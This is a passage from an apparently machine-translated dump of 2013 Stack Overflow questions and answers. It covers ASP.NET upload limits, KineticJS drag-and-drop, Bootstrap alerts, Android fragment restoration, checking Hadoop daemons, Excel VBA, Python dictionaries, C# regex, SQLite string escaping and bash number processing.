protected void UploadFile(object sender, EventArgs e)
{
    if(FileUpload1.HasFile)
    {
        try 
        {
            string[] validTypes = { "bmp", "gif"};
            string ext = System.IO.Path.GetExtension(FileUpload1.PostedFile.FileName);
            int size = FileUpload1.PostedFile.ContentLength;
            int limit = 84304;

            if (size < limit) 
            {
                .....................................                      
            }
            else 
            {
                Label2.ForeColor = System.Drawing.Color.Red;
                Label2.Text = "file is heavy";
            }
        }
        catch (Exception ex)
        {
            Label2.Text = "The file could not be uploaded." + ex.Message;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T19:10:23.290

您收到该错误消息是因为您选择的文件大于 4Mb，这是默认的 . 如果要增加要上传的文件的大小，需要在 web.config 中进行更改。

在 system.web 标签内添加如下一行：

> `<httpRuntime executionTimeout="600" maxRequestLength="512000" />`

其中 600 是秒数，512000 是文件的最大大小（以 Kb 为单位）

# javascript - 使用 mousemove 绘制形状，使用 kineticjs-KineticJS 拖放和调整大小

> ID：15555962
> 
> 赞同：1
> 
> 时间：2013-03-21T19:01:12.277
> 
> 标签：javascript, jquery, canvas, kineticjs

我正在使用 KineticJS 开发一个简单的绘图程序。我必须实现的是用鼠标移动绘制一个矩形、直线或圆形，并且绘制的形状可以通过鼠标拖动或调整大小。我的问题是，我必须使用`mousedown`和`mousemove`事件来绘制，但我不能同时实现拖放或调整大小。

这是我的绘图代码：

```
stage.on("mousedown", function() {
    if ((drawFlag == 1) && (dragFlag == 0)) {
        if (moving) {
            moving = false;
            layer.draw();
        } else {
            var mousePos = stage.getMousePosition();
            line = new Kinetic.Line({
                points: [0, 0, 50, 50],
                stroke: "red"
            });
            layer.add(line);

            line.getPoints()[0].x = mousePos.x;
            line.getPoints()[0].y = mousePos.y;
            line.getPoints()[1].x = mousePos.x;
            line.getPoints()[1].y = mousePos.y;

            moving = true;
            layer.drawScene();
        }
    }

    if ((drawFlag == 2) && (dragFlag == 0)) {
        if (moving) {
            moving = false;
            layer.draw();
        } else {
            var mousePos = stage.getMousePosition();
            rect = new Kinetic.Rect({
                x: 20,
                y: 20,
                fill: "red",
                stroke: "black",
                strokeWidth: 2,
                draggle: true,
                width: 0,
                height: 0
            });

            rect.setX(mousePos.x);
            rect.setY(mousePos.y);
            rect.setWidth(0);
            rect.setHeight(0);

            moving = true;
            layer.drawScene();

            layer.add(rect);

            Rects.push(rect);
        }
    }
});

stage.on("mousemove", function() {
    if ((drawFlag == 1) && (dragFlag == 0)) {
        if (moving) {
            var mousePos = stage.getMousePosition();
            var x = mousePos.x;
            var y = mousePos.y;
            line.getPoints()[1].x = mousePos.x;
            line.getPoints()[1].y = mousePos.y;
            moving = true;
            layer.drawScene();
        }
    }
    if ((drawFlag == 2) && (dragFlag == 0)) {
        if (moving) {
            var mousePos = stage.getMousePosition();
            var x = mousePos.x;
            var y = mousePos.y;
            rect.setWidth(mousePos.x - rect.getX());
            rect.setHeight(mousePos.y - rect.getY());
            moving = true;
            layer.drawScene();
        }
    }
});

stage.on("mouseup", function() {
    moving = false;
}); 
```

绘制一个矩形后，当我点击它时，它应该是用鼠标移动来拖动的。但是，在我的程序中，单击绘制的矩形会导致绘制另一个矩形而不是拖动它。所以我尝试使用一个dragFlag来指示我是在绘制还是在拖动。我使用一个函数来检查鼠标光标是否在任何绘制的矩形上：

```
for (var n = 0; n < Rects.length; n++) {
    (function() {
        Rects[n].on('mouseover', function() {
            dragFlag = 1;
            document.body.style.cursor = "pointer";
        });

        Rects[n].on('mouseout', function() {
            dragFlag = 0;
            document.body.style.cursor = "default";
        });
        if (dragFlag == 1) {
            Rects[n].on("dragstart", function() {
                Rects[n].moveToTop();
                layer.draw();
            });

            Rects[n].on("dragmove", function() {
                document.body.style.cursor = "pointer";
            });
        }

    }); 
```

但这行不通。无法检查鼠标光标的位置，因此我在单击绘制的矩形时仍在绘制新的矩形。任何人都知道如何通过鼠标移动来实现绘图，并在绘制的形状上拖放？

我感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T20:26:23.847

好吧，首先尝试使用以下简单的方法进行调试：

```
Rects[n].on('mouseover', function() {
    dragFlag = 1;
    alert('mouse over rectangle'); //check if event fired
    document.body.style.cursor = "pointer";
}); 
```

真正的问题是你的逻辑变得越来越复杂和快速，你需要对其进行简化和重构。

想想画图，你可以使用选择工具，也可以使用线条工具，或者矩形工具，这不是由舞台上的事件决定的，而是由用户所处的模式决定的。

因此，您应该做的是在单击按钮的任何时候创建按钮并为每个事件分离/重新附加功能。

例子

```
drawLineButton.on('click', function() {
    stage.off(); // or whatever function to remove other events from stage
    stage.on('mousedown', function() {
        draw line logic
    });
});

drawRectButton.on('click', function() {
    stage.off(); // or whatever function to remove other events from stage
    stage.on('mousedown', function() {
        draw rectangle logic
    });
});

dragButton.on('click', function() {
    stage.off(); // or whatever function to remove other events from stage
    // now you dont have to worry about stage events firing and can drag shapes
}); 
```

# jquery - 我的引导警报不显示

> ID：15555963
> 
> 赞同：0
> 
> 时间：2013-03-21T19:01:13.407
> 
> 标签：jquery, twitter-bootstrap

为什么单击时不显示警报？

我有这些 HTML：

```
<div id="submit-errors" class="alert alert-error fade in">
    <button class="close" type="button" data-dismiss="alert"></button>
     <h4 class="alert-heading">Errors</h4>
    <p>sdfgsdg</p>
</div>
<button id='foo'>foo</button> 
```

和 JS 脚本：

```
$('#submit-errors').alert('close');
$('#foo').on('click', function () {
    $('#submit-errors').alert('open');
}); 
```

小提琴：http: [//jsfiddle.net/XKYeg/1/](http://jsfiddle.net/XKYeg/1/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:11:23.953

如果你从不打电话：`$('#submit-errors').alert('close');`

你可以这样做：

```
$('#foo').on('click', function () {
    $('#submit-errors').toggleClass('out, in');
}); 
```

[小提琴：http://jsfiddle.net/XKYeg/3/](http://jsfiddle.net/XKYeg/3/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:20:00.733

如果您希望此警报可以切换，您可能根本不想使用该`alert()`方法。但你可以这样做：

HTML：

```
<div id="submit-errors" class="alert alert-error hide">
    <button id="closeAlert" class="close" type="button"></button>
    <h4 class="alert-heading">Errors</h4>
    <p>sdfgsdg</p>
</div>
<button id='foo'>foo</button> 
```

JS：

```
$('#foo').on('click', function () {
    $('#submit-errors').show();
});

$('#closeAlert').on('click', function () {
    $('#submit-errors').hide();
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T19:18:17.217

因为没有这样的东西，所以调用 open 是引导程序警报......周围的方法是......`hide()`它首先`show()`是点击它

```
$('#submit-errors').hide();
$('#foo').on('click', function () {
    console.log('here');
    $('#submit-errors').show(); //or slideDown() for effect
}); 
```

[在这里摆弄](http://jsfiddle.net/XKYeg/5/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-07-02T12:52:18.037

可能你忘记引用这个：

```
<script src="http://twitter.github.com/bootstrap/assets/js/jquery.js"></script> 
```

我有同样的问题。我添加了它，它起作用了。

# android - 在 Activity 重新创建时如何确定 Fragment 恢复？

> ID：15555964
> 
> 赞同：0
> 
> 时间：2013-03-21T19:01:13.557
> 
> 标签：android, android-layout, android-fragments, android-fragmentactivity, fragmenttransaction

对于`View`有ID的s，调用时会自动保存`super.onSaveInstanceState(outState);`。

对于`Fragment`s 添加到 an `Activity`，在什么情况下会在重新创建时`Activity`重新创建（例如屏幕旋转），在哪些情况下不会？要确定什么？规则是什么？

*到目前为止，我已经尝试了以下案例。但是反复试验并不意味着任何规则或解决方案。*

`Fragment`重新存储s的情况：

1.  正常情况：`FragmentTransaction.add()`带有 ID 的布局。
2.  没有 UI 的片段：`FragmentTransaction.add()`仅到标签

**不**重新存储`Fragment`s 的情况：

 **1.  何时`super.onSaveInstanceState(outState);`跳过。
2.  在没有匹配 ID 的 UI 中恢复`Fragment`s。

一般规则是什么？我在文档中遗漏了什么？

提前致谢。

* * *

# 编辑：

根据我的理解和实验，所有动态（以编程方式）添加`Fragment`的 s 都在`Activity`调用时保存`super.onSaveInstanceState(outState)`。

*   **所有动态（以编程方式）添加`Fragment`的 s**包括，
    *   `Fragment`s 只有一个标签（没有 UI），
    *   `Fragment`s 附加到一个`View`（带有 UI），
    *   和`Fragment`s*同时*带有 UI 和标签。
    *   *（还有其他类型吗？）*

关于将`Fragment`带有 UI 的 a 恢复到没有匹配 ID 的布局中，`Fragment`确实是重新创建的。它只是无法在布局中直观地显示，并带有以下警告消息：

```
04-08 11:41:22.445: W/PhoneWindow(9853): Previously focused view reported id 2131165226 during save, but can't be found during restore. 
```

一旦我们返回到具有匹配 ID 的 UI，它将正确恢复。

* * *

# 我*仍然*期待一些可靠的参考资料和您的意见！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-22T19:47:26.420

我有同样的问题，你可以在这里看到：[屏幕旋转后，findFragmentById() 返回一个片段，即使布局内没有这样的 ID](https://stackoverflow.com/q/19534746/816416)

**[http://developer.android.com/training/basics/fragments/communicating.html](http://developer.android.com/training/basics/fragments/communicating.html)上的 Android 开发者文档引用了这一点：**

> 当配置更改导致托管这些片段的活动重新启动时，其新实例可能会使用不同的布局，该布局不包含与先前布局相同的片段。在这种情况下，所有先前的片段仍将被实例化并在新实例中运行。但是，任何不再与视图层次结构中的标记关联的内容都不会创建其内容视图，并且将从 isInLayout() 返回 false。（此处的代码还显示了如何确定放置在容器中的片段是否不再在具有该容器的布局中运行，并避免在这种情况下创建其视图层次结构。）

这意味着，我们必须检查屏幕方向而不是相信空指针检查。**

# linux - How to check if Hadoop daemons are running?

> ID：15555965
> 
> 赞同：26
> 
> 时间：2013-03-21T19:01:13.350
> 
> 标签：linux, hadoop

What are simple commands to check if Hadoop daemons are running?

For example if I'm trying to figure out why HDFS is not setup correctly I'll want to know a way to check if namemonode/datanode/jobtracker/tasktracker are running on this machine.

Is there any way to check it fast without looking into logs or using ps(on Linux)?

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-21T19:08:00.393

In the shell type 'jps' (you might need a jdk to run jps). It lists all the running java processes and will list out the hadoop daemons that are running.

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-08-20T17:25:23.243

If you see hadoop process is not running on `ps -ef|grep hadoop`, run `sbin/start-dfs.sh`. Monitor with `hdfs dfsadmin -report`:

```
[mapr@node1 bin]$ hadoop dfsadmin -report
Configured Capacity: 105689374720 (98.43 GB)
Present Capacity: 96537456640 (89.91 GB)
DFS Remaining: 96448180224 (89.82 GB)
DFS Used: 89276416 (85.14 MB)
DFS Used%: 0.09%
Under replicated blocks: 0
Blocks with corrupt replicas: 0
Missing blocks: 0

-------------------------------------------------
Datanodes available: 2 (2 total, 0 dead)

Name: 192.168.1.16:50010
Decommission Status : Normal
Configured Capacity: 52844687360 (49.22 GB)
DFS Used: 44638208 (42.57 MB)
Non DFS Used: 4986138624 (4.64 GB)
DFS Remaining: 47813910528(44.53 GB)
DFS Used%: 0.08%
DFS Remaining%: 90.48%
Last contact: Tue Aug 20 13:23:32 EDT 2013

Name: 192.168.1.17:50010
Decommission Status : Normal
Configured Capacity: 52844687360 (49.22 GB)
DFS Used: 44638208 (42.57 MB)
Non DFS Used: 4165779456 (3.88 GB)
DFS Remaining: 48634269696(45.29 GB)
DFS Used%: 0.08%
DFS Remaining%: 92.03%
Last contact: Tue Aug 20 13:23:34 EDT 2013 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-03-22T21:47:19.773

I did not find great solution to it, so I used

```
ps -ef | grep hadoop | grep -P  'namenode|datanode|tasktracker|jobtracker' 
```

just to see if stuff is running

and

```
./hadoop dfsadmin -report 
```

but last was not helpful until server was running.

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2014-12-09T19:33:12.080

you can use Jps command as vipin said like this command :

```
/usr/lib/java/jdk1.8.0_25/bin/jps 
```

of course you will change the path of java with the one you have "the path you installed java in"
**Jps** is A nifty tool for checking whether the expected Hadoop processes are running (part of Sun’s Java since v1.5.0).
the result will be something like that :

```
2287 TaskTracker  
2149 JobTracker  
1938 DataNode  
2085 SecondaryNameNode  
2349 Jps  
1788 NameNode 
```

I get the answer from this tutorial: [http://www.michael-noll.com/tutorials/running-hadoop-on-ubuntu-linux-single-node-cluster/](http://www.michael-noll.com/tutorials/running-hadoop-on-ubuntu-linux-single-node-cluster/)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-03-21T20:22:17.483

apart from jps, another good idea is to use the web interfaces for NameNode and JobTracker provided by Hadoop. It not only shows you the processes but provides you a lot of other useful info like your cluster summary, ongoing jobs etc atc. to go to the NN UI point your web browser to "YOUR_NAMENODE_HOST:9000" and for JT UI "YOUR_JOBTRACKER_HOST:9001".

* * *

## 回答 #6

> 赞同：5
> 
> 时间：2014-03-19T15:54:38.403

Try `jps` command. It specifies the java processes which are up and running.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-03-01T16:38:58.547

To check whether Hadoop Nodes are running or not:

```
sudo -u hdfs hdfs dfsadmin -report 
```

> Configured Capacity: 28799380685 (26.82 GB)
> Present Capacity: 25104842752 (23.38 GB)
> DFS Remaining: 25012056064 (23.29 GB)
> DFS Used: 92786688 (88.49 MB)
> DFS Used%: 0.37%
> Under replicated blocks: 436
> Blocks with corrupt replicas: 0
> Missing blocks: 0
> 
> * * *
> 
> Datanodes available: 1 (1 total, 0 dead)
> 
> Live datanodes:
> Name: 127.0.0.1:50010 (localhost.localdomain)
> Hostname: localhost.localdomain
> Rack: /default
> Decommission Status : Normal
> Configured Capacity: 28799380685 (26.82 GB)
> DFS Used: 92786688 (88.49 MB)
> Non DFS Used: 3694537933 (3.44 GB)
> DFS Remaining: 25012056064 (23.29 GB)
> DFS Used%: 0.32%
> DFS Remaining%: 86.85%
> Last contact: Thu Mar 01 22:01:38 IST 2018

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-05-14T16:30:28.197

To check deamons are running?

You can check with jps command

use use below commands also

```
ps -ef | grep -w namenode 
```

`ps -ef | grep -w datanode`

```
ps -ef | grep -w tasktracker 
```

-w :- will help to fetch the exact string

If you have Superuser privilege then you can also use below one for the same:

```
./hadoop dfsadmin -report 
```

Hope this will help !!!

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2015-02-10T04:52:21.433

Try running this:

```
for service in /etc/init.d/hadoop-hdfs-*; do $service status; done; 
```

# mouse - 处理中的精确鼠标坐标

> ID：15555966
> 
> 赞同：0
> 
> 时间：2013-03-21T19:01:16.847
> 
> 标签：mouse, processing, precision, decimal

我在处理 jpg 图像时跟踪鼠标坐标，我想知道是否有任何方法可以增加 x 和 y 坐标返回的小数点数。该图像为 1000 像素 x 1000 像素，因此我已将窗口的大小设置为该大小，但我希望鼠标坐标至少保留 2 个小数位。这是可能的还是只会跟踪定义空间中的像素？

一如既往地感谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T22:16:45.893

这是无法做到的；Processing 根据光标所在像素阵列中的哪个像素报告鼠标坐标。这些值是整数。

# excel - 获取Excel表格代码

> ID：15555967
> 
> 赞同：0
> 
> 时间：2013-03-21T19:01:17.467
> 
> 标签：excel, vba

在谷歌上搜索 Excel 表单后，我发现[了这个](https://stackoverflow.com/questions/327361/how-do-i-add-a-form-in-an-excel-sheet)问题。虽然问题没有很好地提出，但我觉得[这个答案](https://stackoverflow.com/a/331494/1128699)很好。

我用我的数据试了一下，excel确实为我提供了相当不错的表格。但我想对其进行一些修改（例如添加一个直接搜索字段）。所以我的问题是：有没有办法获取这种形式的 VBA 代码（Excel 自动表单），或者以其他方式修改它？

还有我怎样才能让这个表单被按钮调用，这样我就不必每次都创建一个新表单。（如果我有它的 VBA 代码，我可以这样做。）

如果有人知道如何做到这一点，我将不胜感激。感谢您的任何建议和帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:26:46.437

如果您只需要调用该数据表单，请使用以下内容：

```
Range("A1").Select    'assuming there is any cell of your data
ActiveSheet.ShowDataForm 
```

我认为您不能以任何方式更改或修改该表格。

# python - build_person_to_matches

> ID：15555968
> 
> 赞同：-4
> 
> 时间：2013-03-21T19:01:20.580
> 
> 标签：python, python-2.7, python-3.x

d=字典

想要功能能够返回`{'John':1,'Mark':3}`

```
def build_person_to_matches(d, name): '''(dict of {str: list of str}, str) -> dict of {str: int}'''
    collect = 0
    for books in d[name]:
        for person in d.keys():
            if books in d[person]:
               collect += 1
        d[person] = collect
    return d 
```

但该功能不适用于以下示例：

```
build_person_to_matches({'Tom': ['fiction', 'documentary', 'science'],'John': ['computer science', 'math'],'Jack': ['science', 'computer science', 'math', 'chemistry']}, 'Jack') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:40:06.050

首先，您应该将传入的字典和要返回的字典分开。

```
def build_person_to_matches(d, name):
    ret = {}
    collect = 0
    for books in d[name]:
        for person in d.keys():
            if books in d[person]:
               collect += 1
        ret[person] = collect
    return ret

d = {
    'Tom': ['fiction', 'documentary', 'science'],
    'John': ['computer science', 'math'],
    'Jack': ['science', 'computer science', 'math', 'chemistry']
}
print build_person_to_matches(d, 'Jack') 
```

其次，切换两个for循环的顺序，将`collect = 0`行移到第一个循环中。

```
def build_person_to_matches(d, name):
    ret = {}
    for person in d.keys():
        collect = 0
        for books in d[name]:
            if books in d[person]:
               collect += 1
        ret[person] = collect
    return ret

d = {
    'Tom': ['fiction', 'documentary', 'science'],
    'John': ['computer science', 'math'],
    'Jack': ['science', 'computer science', 'math', 'chemistry']
}
print build_person_to_matches(d, 'Jack') 
```

可选地，为了可读性，您也可以将内部循环移到它自己的函数中，以使读者更清楚地了解正在发生的事情。

```
def how_many_genres_both_people_like(d, person_a, person_b):
    total = 0
    for books in d[person_a]:
        if books in d[person_b]:
           total += 1
    return total

def build_person_to_matches(d, name):
    ret = {}
    for person in d.keys():
        ret[person] = how_many_genres_both_people_like(d, name, person)
    return ret

d = {
    'Tom': ['fiction', 'documentary', 'science'],
    'John': ['computer science', 'math'],
    'Jack': ['science', 'computer science', 'math', 'chemistry']
}
print build_person_to_matches(d, 'Jack') 
```

输出：

```
{'John': 2, 'Jack': 4, 'Tom': 1} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:26:32.927

```
for entry in d:
    print(entry + ':' + str(len(d[entry]))) 
```

（如果你把它放在一个函数中，用 return 替换 print ）

它遍历字典“d”中的每个条目，然后找到相应条目的长度。只要确保将字典条目保持在您拥有的列表格式中，它应该可以解决！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T20:06:45.373

使用字典推导和一些集合操作：

```
def build_person_to_matches(d, name):
    return {n:len(set(d[n]) & set(d[name])) for n in d} 
```

或者，如果您不希望名称参数出现在匹配项中

```
def build_person_to_matches(d, name):
    return {n:len(set(d[n]) & set(d[name])) for n in d if n != name} 
```

如果你不喜欢使用“&”来设置交集，你可以更具描述性

```
def build_person_to_matches(d, name):
    return {n:len(set(d[n]).intersection(d[name])) for n in d if n != name} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-21T19:36:07.163

`for books in d[name]:`您可能希望在每个循环开始时重置收集值

# vba - 在单元格中指定 n 的范围内复制 n 次

> ID：15555970
> 
> 赞同：0
> 
> 时间：2013-03-21T19:01:24.033
> 
> 标签：vba, excel

首先，我是 VBA 的新手。我正在尝试将 A 列和 B 列（动态行）中的范围复制“n”次，其中我将单元格“c2”中的 n 值指定到同一工作簿中的另一张工作表中。

```
Column A   Column B

DDDDDD      d345g
THFGJJ      th567
JKHNGF      thgf4
UJHG67      uj768
tkm78y      y7865 
```

这是我尝试过的，但它给了我一个中断错误。

```
Sub rangecopy()

    Application.ScreenUpdating = False
    Dim rangeini As Long
    Dim i As Integer
    rangeini = Sheets("sheet1").[a10000].End(xlUp).Row+1 //range of data to copy
    n = Sheets("sheet1").range("c2")//number of times to be copied
    For i = 1 To n

        rangeini.Copy
        Sheets("sheet2").range("A2").PasteSpecial//data to be pasted here

    Next i
    Application.ScreenUpdating = True 

End Sub 
```

我正在修复中并尽快需要它。非常感谢任何帮助。

请编写一个简单的代码，以便新手能够理解并从中学习。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T14:25:06.410

这只是一个简单的复制/粘贴

```
Sub rangecopy()

    Dim i As Integer, n As Integer
    Dim intHowmany As Integer

    n = Sheets("sheet1").Range("c2") 'number of times to be copied

    Range("a2").Select
    Range(Selection, Selection.End(xlDown)).Select
    Range(Selection, (Selection.Offset(0, 1))).Select

    Selection.Copy

    intHowmany = Selection.Rows.Count

    ActiveWorkbook.Worksheets(2).Select
    Range("a2").Select

    For i = 1 To n

        ActiveSheet.Paste
        ActiveCell.Offset(intHowmany, 0).Select

    Next i

End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T11:05:22.270

```
Sub rangecopy() 

    Application.ScreenUpdating = False 
    Dim rangeini As range  
    Dim i As Integer, n as integer
    Set rangeini = Sheets("sheet1").range("a2").resize(Sheets("sheet1").[a2].End(xlDown).Row - 1, 2) 'range of data to copy 
    n = Sheets("sheet1").range("c2") 'number of times to be copied

    Sheets("sheet2").[a2] = rangeini 'paste the first one in "a2"
    For i = 2 To n

        Sheets("sheet2").[a1].Offset(Sheets("sheet2").[a2].End(xlDown).row) = rangeini  'data to be pasted at the end 

    Next i 
    Application.ScreenUpdating = True

End Sub 
```

# c# - C#正则表达式如何进行这种匹配

> ID：15555977
> 
> 赞同：-2
> 
> 时间：2013-03-21T19:01:44.443
> 
> 标签：c#, regex, collections, match

请帮我解决问题，非常感谢

```
string=
"
<span id="thread_aaaa" class="tsubject">
    <a href="viewthread.php?tid=12343245&amp;extra=page%3D1"> 
        WHAT I WANT TO GET1 
    </a>
</span>

<span id="thread_bbbb" class="tsubject">
    <a href="viewthread.php?tid=65456342&amp;extra=page%3D1">
        WHAT I WANT TO GET2
    </a>
</span>
" 
```

我需要获得 WHAT I WANT TO GET1 、 WHAT I WANT TO GET2 等的值

我正在使用： `( " < span id=\"thread_)(.+?)< /a>< /span>")`，但不起作用，求助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:48:11.760

对于给出的新示例字符串，这将找到它们：

```
string str = @"
< span id=""thread_aaaa"" class=""tsubject"" >< a href=""viewthread.php?tid=12343245&extra=page%3D1"" > WHAT I WANT TO GET1 < /a >< / span>

< span id=""thread_bbbb"" class=""tsubject"">< a href=""viewthread.php?tid=65456342&extra=page%3D1"" >WHAT I WANT TO GET2</a>< /span>";

Regex regex1 = new Regex(@"href.*>(.*)< *\/a");
var matches = regex1.Matches(str);

foreach (var m in matches)
{
    var match = (Match) m;
    Console.WriteLine(match.Groups[1].Value.Trim()); // write the value to the console "pattern"
}

/*
Output:
WHAT I WANT TO GET1 
WHAT I WANT TO GET2
*/ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:31:17.190

您正在寻找的正则表达式是：

```
(?<=aaa)(.*)(?=bbb) 
```

// 匹配两个字符串 aaa 和 bbb 之间的任何字符

# c++ - 使用 C++ 清理输入

> ID：15555980
> 
> 赞同：0
> 
> 时间：2013-03-21T19:02:02.837
> 
> 标签：c++, sqlite

我正在尝试清理我对 SQLite 数据库的输入，并且我正在使用`sqlite3_mprintf`它，但我得到了一些奇怪的结果。我尝试了不同的变化，我做错了吗？

```
const char * zChar = "It's a nice day";
cout << sqlite3_mprintf("INSERT INTO table(col1) VALUES('%Q')", zChar) << endl;
//INSERT INTO table(col1) VALUES(''It''s a nice day'')

cout << sqlite3_mprintf("INSERT INTO table(col1) VALUES(%Q)", zChar) << endl;
//INSERT INTO table(col1) VALUES('It''s a nice day')

cout << sqlite3_mprintf("INSERT INTO table(col1) VALUES('%q')", zChar) << endl;
//INSERT INTO table(col1) VALUES('It''s a nice day')

cout << sqlite3_mprintf("INSERT INTO table(col1) VALUES(%q)", zChar) << endl;
//INSERT INTO table(col1) VALUES(It''s a nice day) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T19:07:15.813

```
sqlite3_mprintf("INSERT INTO table(col1) VALUES(%Q)", zChar)
//INSERT INTO table(col1) VALUES('It''s a nice day')

sqlite3_mprintf("INSERT INTO table(col1) VALUES('%q')", zChar)
//INSERT INTO table(col1) VALUES('It''s a nice day') 
```

这些都是正确的。`''`是转义引号。该`%Q`选项只是添加周围的引号本身。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-21T19:06:58.317

根据[文档](http://www.sqlite.org/c3ref/mprintf.html)，这是预期的行为。该文件还指出：

> 作为一般规则，在将文本插入字符串文字时，您应该始终使用 %q 而不是 %s。

# bash - 在 bash 中处理一行分隔数字

> ID：15555981
> 
> 赞同：3
> 
> 时间：2013-03-21T19:02:06.517
> 
> 标签：bash, numbers, delimited

我有一行数字，我希望能够一个一个地处理它们。例如。

```
3829 4837 3729 2874 3827 
```

我希望能够得到总和，最大的数字，任何东西。但我不知道如何让每个号码来处理它。我会 REAAAAALLLLLLLLLY 喜欢坚持使用纯 bash，我不介意 bash 中复杂的解决方案。但如果 awk 是绝对必要的，我会使用它。我不想使用 sed。

我想我可以做类似的事情：

```
max= cut -d" " -f1
in line L cut -d" " -f$(loop index) 
#check for max 
```

我很困惑。

编辑：感谢您的回答，我看到了一些我在 bash 中从未见过的新事物，我已准备好进一步探索它们。我收到了我想要的信息，甚至更多！:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T19:04:04.080

如果要一个一个处理进程号，请利用*shell 分词*：

```
numbers="3829 4837 3729 2874 3827"
 for n in $numbers; do
     # do something with "$n"
done 
```

* * *

`SUM`：

```
numbers="3829 4837 3729 2874 3827"
echo $((${numbers// /+})) 
```

或者

```
numbers="3829 4837 3729 2874 3827"
for n in $numbers; do
     ((sum+=n))
done

echo $sum 
```

* * *

`LARGEST`：

```
numbers="3829 4837 3729 2874 3827"
for n in $numbers; do
     ((max<n)) && max=$n
done

echo $max 
```

* * *

或者，如果您想要一个`SUM`带有一些 shell 技巧的全局变量：

```
$ tr ' ' '+' <<< '3829 4837 3729 2874 3827' | bc                                 
19096 
```

或者

```
$ awk '{$1=$1; print}' OFS=+ <<< '3829 4837 3729 2874 3827' | bc
19096 
```

或者

```
$ echo  '3829 4837 3729 2874 3827' |
    awk '{for (i=1; i<=NF; i++) c+=$i} {print c}'
19096 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-21T19:14:41.603

如果您在字符串中有数字列表，则按以下方式处理它们是拆分和迭代的最安全方法（同时避免全局扩展或其他副作用）：

```
max=0
read -r -a number_array <<<"$numbers"
for number in "${number_array[@]}"; do
  if (( number > max )) ; then
    max=number
  fi
done 
```

如果您正在读取文件，则需要进行简单的修改（有关读取文件的最佳做法，请参阅[http://mywiki.wooledge.org/BashFAQ/001 ）：](http://mywiki.wooledge.org/BashFAQ/001)

```
max=0
while read -r -a numbers; do
  for number in "${numbers[@]}"; do
    if (( number > max )) ; then
      max=number
    fi
  done
done <input-file 
```

如果你的分隔符是别的东西，你可以适当地设置 IFS。例如，如果用逗号分隔：

```
while IFS=, read -r -a numbers; do 
```

请注意，当您的值确实仅限于数字时，此处给出的最佳实践并不重要。但是，如果您`*`的输入数据中有 a ，并且您只需运行

```
for number in $numbers; do 
```

然后字符串`*`中的`$numbers`将替换为当前目录中的文件列表。不要那样做。

最后一点——bash 没有对浮点数学的内置支持。如果您需要浮点数学，请参阅[http://mywiki.wooledge.org/BashFAQ/022](http://mywiki.wooledge.org/BashFAQ/022)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T20:02:51.540

这里有几种方法可以将一串单词拆分成一个可以迭代的结构：

使用[位置参数](http://www.gnu.org/software/bash/manual/bashref.html#Positional-Parameters)

```
numbers="3829 4837 3729 2874 3827"
set -- $numbers
sum=0
for n in "$@"; do
    # do something with $n
    (( sum += n ))
done
average=$(( sum / $# ))   # integer division only 
```

使用实际[数组](http://www.gnu.org/software/bash/manual/bashref.html#Arrays)

```
numbers="3829 4837 3729 2874 3827"
nums=( $numbers )
sum=0
for n in "${nums[@]}"; do
    # do something with $n
    (( sum += n ))
done
average=$(( sum / ${#nums[@]} ))   # integer division only 
```

# javascript - 脚本无法在 JQuery Mobile 1.2.0 中运行

> ID：15555986
> 
> 赞同：0
> 
> 时间：2013-03-21T19:02:31.977
> 
> 标签：javascript, jquery, jquery-mobile

我在一个单独的 js 文件中有一个脚本，现在包含

```
$('#page-seriesLevel').live('pageinit', function(){
   console.log(document.URL + ' loaded.');}); 
```

理想情况下，当页面准备好时，从 series.php 调用它，并且 catalog.php 链接到 series.php。

但是当我从catalog.php 转到那个页面时，脚本没有执行。我必须刷新才能看到它。有时脚本从catalog.php 执行，它不应该执行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:10:01.153

我对你的要求有点困惑。如果问题是每次访问页面时都没有触发页面加载事件“pageinit”，请尝试使用“pagebeforeshow”或“pageshow”。'pageinit' 仅在您第一次访问该页面时触发。

有关详细信息，请参阅[http://jquerymobile.com/demos/1.2.0/docs/api/events.html](http://jquerymobile.com/demos/1.2.0/docs/api/events.html)上的“页面加载事件”部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T20:19:53.470

我知道 JQM 通过 ajax 加载页面，但我不知道它只是加载元素`data-role="page"`，忽略头部（我的 JS 所在的位置），正如这个答案所说。[https://stackoverflow.com/a/7449731/677331](https://stackoverflow.com/a/7449731/677331)

# java - 当视图包含列表视图时，Android OnGestureListener 问题

> ID：15555990
> 
> 赞同：2
> 
> 时间：2013-03-21T19:02:42.747
> 
> 标签：java, android, android-listview, gesture-recognition
